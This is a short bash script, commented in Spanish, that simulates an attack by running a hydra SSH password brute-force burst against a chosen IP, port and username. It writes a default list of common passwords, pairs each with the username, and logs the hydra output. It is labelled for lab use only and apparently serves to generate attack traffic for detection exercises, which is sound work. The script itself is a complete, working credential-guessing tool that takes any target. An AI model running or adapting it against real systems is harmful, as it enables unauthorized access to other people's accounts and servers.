#!/usr/bin/env bash
# simula_ataque.sh — ráfaga de hydra contra la víctima (solo en tu laboratorio).
# Uso: simula_ataque.sh <IP> [intentos] [puerto]
#   USUARIO=kali   usuario atacado (def. kali)
#   DICC=fichero   contraseñas, una por línea (def. una lista de prueba)
set -euo pipefail
IP=${1:?falta la IP objetivo}
N=${2:-100}
PUERTO=${3:-22}
USUARIO=${USUARIO:-kali}
[[ $N =~ ^[0-9]+$ ]] || { echo "intentos debe ser un número"; exit 1; }

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
DICC=${DICC:-$TMP/diccionario.txt}
if [[ ! -s $DICC ]]; then
  printf '%s\n' root admin kali test oracle 123456 toor password qwerty letmein > "$DICC"
  for i in $(seq 1 90); do printf 'P%02d%s\n' "$i" "w" >> "$DICC"; done
fi

# hydra -C espera "usuario:contraseña". Antes se generaba ":contraseña" (usuario
# vacío) y hydra acababa usando el usuario local de quien lanzara el ataque.
head -n "$N" "$DICC" | while IFS= read -r clave; do
  printf '%s:%s\n' "$USUARIO" "$clave"
done > "$TMP/pares.txt"
echo "objetivo $IP:$PUERTO, usuario $USUARIO, $(wc -l < "$TMP/pares.txt") contraseñas"
cd "$TMP"   # hydra deja aquí su hydra.restore
hydra -C "$TMP/pares.txt" -t 2 -I -V "ssh://$IP:$PUERTO" 2>&1 | tee "$OLDPWD/ataque_${IP}_${PUERTO}.log"
